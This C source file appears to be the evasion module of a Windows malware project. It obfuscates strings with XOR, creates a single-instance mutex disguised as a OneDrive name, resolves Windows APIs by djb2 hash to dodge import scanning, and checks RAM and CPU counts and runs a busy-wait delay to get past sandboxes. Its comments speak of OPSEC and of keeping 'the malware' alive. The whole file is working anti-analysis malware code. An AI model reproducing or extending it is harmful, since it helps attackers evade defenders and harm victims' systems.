#include "config.h"
#include "evasion.h"
#include <stdio.h>

void xor_crypt(char *data, size_t data_len, const char *key, size_t key_len) {
    if (data_len == 0 || key_len == 0) {
        return; 
    }

    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key[i % key_len];
    }

    // NOTE: no return -> data is modified in RAM
}

bool check_mutex() {

    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);

    char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
    
    // encoded string for Mutex name
    // NOTE: encrypt the string "Global\\OneDriveSyncMutex" using string_encryptor.py!
    char enc_mutex[] = { 0x18, 0x1f, 0x1a, 0x12, 0x52, 0x1f, 0x6f, 0x2c, 0x1c, 0x56, 0x30, 0x19, 0x5a, 0x0f, 0x3a, 0x0c, 0x0a, 0x1b, 0x13, 0x7e, 0x06, 0x47, 0x06, 0x0a, 0x33 };

    // API hashes
    DWORD hash_CreateMutexA = 0x6FA1320D;  // djb2 for "CreateMutexA"
    DWORD hash_GetLastError = 0x2082EAE3;  // djb2 for "GetLastError"

    // kernel32.dll
    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
    // OPSEC: recypher DLL name immediately
    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);

    if (!hKernel32) return false;

    // --- dynamic resolution via hashing
    pCreateMutexA fnCreateMutexA = (pCreateMutexA) get_api_by_hash(hKernel32, hash_CreateMutexA);
    pGetLastError fnGetLastError = (pGetLastError) get_api_by_hash(hKernel32, hash_GetLastError);

    if (!fnCreateMutexA || !fnGetLastError) return false;

    // decrypt mutex name
    xor_crypt(enc_mutex, sizeof(enc_mutex), cypher_key, cypher_key_len);
    
    // create mutex
    HANDLE hMutex = fnCreateMutexA(NULL, FALSE, enc_mutex);
    
    // OPSEC: recypher immediately
    xor_crypt(enc_mutex, sizeof(enc_mutex), cypher_key, cypher_key_len);

    // check if it was already running
    if (fnGetLastError() == ERROR_ALREADY_EXISTS) {
        // another instance is running, kill current execution
        return false;
    }

    // NOTE: Do NOT close hMutex here! 
    // we want it to remain open as long as the malware is alive.
    return true;
}

bool check_resources() {
    // check RAM
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo); // Windows API to read memory
    
    DWORDLONG ram_mb = memInfo.ullTotalPhys / (1024 * 1024);
    
    if (ram_mb < 3000) { 
        return false; 
    }

    // check CPU cores
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo); // Windows API to read hardware info
    
    if (sysInfo.dwNumberOfProcessors < 2) {
        return false;
    }

    return true;
}

void smart_delay() {
    // NOTE: volatile is fundamental
    // otherwise C compiler would skip the cycle because useless
    volatile int garbage = 0;
    
    // cycle to pass the 3-5 seconds sandbox
    // NOTE: we cannot use Sleep() -> skipped in sandbox
    for (int i = 0; i < SANDBOX_DELAY_CYCLES; i++) {
        garbage += i;
        garbage -= i;
    }
}

DWORD djb2_hash(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    }
    return hash;
}

FARPROC get_api_by_hash(HMODULE hModule, DWORD api_hash) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    // find NT header
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    // get EAT address
    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDir.VirtualAddress);

    // get EAT arrays
    PDWORD pNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    PWORD pOrdinals = (PWORD)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfFunctions);

    // cycle all functions exported by the DLL
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)hModule + pNames[i]);
        
        // calculate hash of current function name
        DWORD current_hash = djb2_hash(functionName);

        if (current_hash == api_hash) {
            // get function address
            WORD ordinal = pOrdinals[i];
            FARPROC functionAddress = (FARPROC)((BYTE*)hModule + pFunctions[ordinal]);
            return functionAddress;
        }
    }

    return NULL; // function not found
}